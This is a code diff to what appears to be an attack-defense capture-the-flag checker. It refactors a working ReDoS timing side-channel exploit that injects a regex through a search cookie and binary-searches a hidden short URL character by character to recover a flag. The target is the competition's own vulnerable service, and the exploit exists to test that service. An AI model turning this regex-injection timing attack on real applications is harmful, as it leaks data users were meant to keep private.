@@ -11,7 +11,7 @@ import re
 import string
 from collections.abc import Sequence
 from html import escape
-from typing import Self
+from typing import NamedTuple
 from urllib.parse import parse_qs, quote, unquote, urlencode
 
 import fastapi
@@ -224,82 +224,100 @@ async def _getflag(task: GetflagCheckerTaskMessage, client: httpx.AsyncClient, d
     assert_in(quote(task.flag), url, "Flag missing")
 
 
-class _ReDoS:
-    @classmethod
-    async def calibrate(cls, logger: logging.LoggerAdapter, client: httpx.AsyncClient) -> Self:
-        await _register_user(client, _alnum_noise(2**7))
+async def _time_redos(client: httpx.AsyncClient, sem: asyncio.Semaphore, n: int, domain: str, regex: str) -> float:
+    mid = len(_SHORT_URL_PREFIX) // 2
+    pre, char, suf = (
+        _SHORT_URL_PREFIX[:mid].translate(_REGEX_ESCAPE),
+        _SHORT_URL_PREFIX[mid].translate(_REGEX_ESCAPE),
+        _SHORT_URL_PREFIX[mid + 1 :].translate(_REGEX_ESCAPE),
+    )
+    redos = pre + f"{char}*" * n + suf
 
-        domain = f"{_lower_noise(2**7)}.com"
-        await _register_domain(client, domain)
-
-        await _submit_page(client, domain, f"{_SHORT_URL_PREFIX}abc")
-
-        for n in range(6, 20):
-            inst = cls(logger, client, n, 0)
-
-            match_time = await inst._sample(domain, "abc")
-            nomatch_time = await inst._sample(domain, "xyz")
-            inst._bound = (match_time + nomatch_time) / 2
-
-            logger.info("match took %r seconds with n=%d", match_time, n)
-            logger.info("nomatch took %r seconds with n=%d", nomatch_time, n)
-            logger.info("bound would be %r", inst._bound)
-
-            if nomatch_time > match_time and nomatch_time >= 4 * match_time:
-                break
-
-        return inst
-
-    def __init__(self, logger: logging.LoggerAdapter, client: httpx.AsyncClient, n: int, bound: float) -> None:
-        self._logger = logger
-        self._client = client
-        mid = len(_SHORT_URL_PREFIX) // 2
-        pre, char, suf = (
-            _SHORT_URL_PREFIX[:mid].translate(_REGEX_ESCAPE),
-            _SHORT_URL_PREFIX[mid].translate(_REGEX_ESCAPE),
-            _SHORT_URL_PREFIX[mid + 1 :].translate(_REGEX_ESCAPE),
+    async with sem:
+        res = await client.get(
+            "/search?" + urlencode({"q": f"site:{domain}"}),
+            cookies={"safe_search": _cookieencode({"enabled": "on", "regex": redos + regex})},
         )
-        self._re = pre + f"{char}*" * n + suf
-        self._bound = bound
-        self._sem = asyncio.Semaphore(2)
+    assert_equals(res.status_code, 200, "Unexpected HTTP status")
 
-    async def _time(self, domain: str, regex: str) -> float:
-        async with self._sem:
-            res = await self._client.get(
-                "/search?" + urlencode({"q": f"site:{domain}"}),
-                cookies={"safe_search": _cookieencode({"enabled": "on", "regex": self._re + regex})},
-            )
-        assert_equals(res.status_code, 200, "Unexpected HTTP status")
+    t = re.search(r"\b[0-9]\.[0-9]{3}\b", res.text)
+    if not t:
+        raise MumbleException("Failed to find timing output")
 
-        t = re.search(r"\b[0-9]\.[0-9]{3}\b", res.text)
-        if not t:
-            raise MumbleException("Failed to find timing output")
-
-        return float(t[0])
-
-    async def _sample(self, domain: str, regex: str) -> float:
-        aws = (self._time(domain, regex) for _ in range(5))
-        return sum(await asyncio.gather(*aws)) / 5
-
-    async def match(self, domain: str, regex: str) -> bool:
-        t = await self._time(domain, regex)
-        self._logger.info("redos search took %r seconds", t)
-        return t < self._bound
+    return float(t[0])
 
 
-@_CHECKER.register_dependency
-async def _redos(logger: logging.LoggerAdapter, client: httpx.AsyncClient) -> _ReDoS:
-    return await _ReDoS.calibrate(logger, client)
+async def _sample_redos_time(
+    client: httpx.AsyncClient,
+    sem: asyncio.Semaphore,
+    n: int,
+    domain: str,
+    regex: str,
+) -> float:
+    aws = (_time_redos(client, sem, n, domain, regex) for _ in range(10))
+    return sum(await asyncio.gather(*aws)) / 10
 
 
-async def _exploit_sca_letter(redos: _ReDoS, attack_info: str, idx: int) -> str:
+class _ReDoSCalibration(NamedTuple):
+    sem: asyncio.Semaphore
+    n: int
+    bound: float
+
+
+async def _calibrate_redos(
+    logger: logging.LoggerAdapter,
+    client: httpx.AsyncClient,
+    sem: asyncio.Semaphore,
+) -> _ReDoSCalibration:
+    await _register_user(client, _alnum_noise(2**7))
+
+    domain = f"{_lower_noise(2**7)}.com"
+    await _register_domain(client, domain)
+
+    await _submit_page(client, domain, f"{_SHORT_URL_PREFIX}abc")
+
+    for n in range(5, 20):
+        match_time = await _sample_redos_time(client, sem, n, domain, "abc")
+        nomatch_time = await _sample_redos_time(client, sem, n, domain, "xyz")
+
+        logger.info("match took %r seconds with n=%d", match_time, n)
+        logger.info("nomatch took %r seconds with n=%d", nomatch_time, n)
+
+        if nomatch_time > match_time and nomatch_time >= 5 * match_time:
+            return _ReDoSCalibration(sem, n, (match_time + nomatch_time) / 2)
+
+    raise MumbleException("Couldn't calibrate ReDoS timing")
+
+
+async def _redos_match(
+    logger: logging.LoggerAdapter,
+    client: httpx.AsyncClient,
+    cal: _ReDoSCalibration,
+    domain: str,
+    regex: str,
+) -> bool:
+    t = await _time_redos(client, cal.sem, cal.n, domain, regex)
+    logger.info("redos search took %r seconds", t)
+    return t < cal.bound
+
+
+async def _exploit_sca_letter(
+    logger: logging.LoggerAdapter,
+    client: httpx.AsyncClient,
+    cal: _ReDoSCalibration,
+    attack_info: str,
+    idx: int,
+) -> str:
     lo = 0
     hi = len(_SHORT_URL_ALPHABET) - 1
 
     while lo < hi:
         mid = (lo + hi) // 2
 
-        if await redos.match(
+        if await _redos_match(
+            logger,
+            client,
+            cal,
             attack_info,
             "[0-9a-f]" * idx
             + "["
@@ -316,14 +334,16 @@ async def _exploit_sca_letter(redos: _ReDoS, attack_info: str, idx: int) -> str:
 
 @_CHECKER.exploit(0)
 async def _exploit_sca(
-    task: ExploitCheckerTaskMessage,
+    logger: logging.LoggerAdapter,
     client: httpx.AsyncClient,
-    redos: _ReDoS,
+    task: ExploitCheckerTaskMessage,
 ) -> str:
     if task.attack_info is None:
         raise MumbleException("Missing attack info")
 
-    aws = (_exploit_sca_letter(redos, task.attack_info, i) for i in range(_SHORT_URL_LENGTH))
+    cal = await _calibrate_redos(logger, client, asyncio.Semaphore(2))
+
+    aws = (_exploit_sca_letter(logger, client, cal, task.attack_info, i) for i in range(_SHORT_URL_LENGTH))
     short_url = _SHORT_URL_PREFIX + "".join(await asyncio.gather(*aws))
 
     url = await _get_short_url(client, short_url)
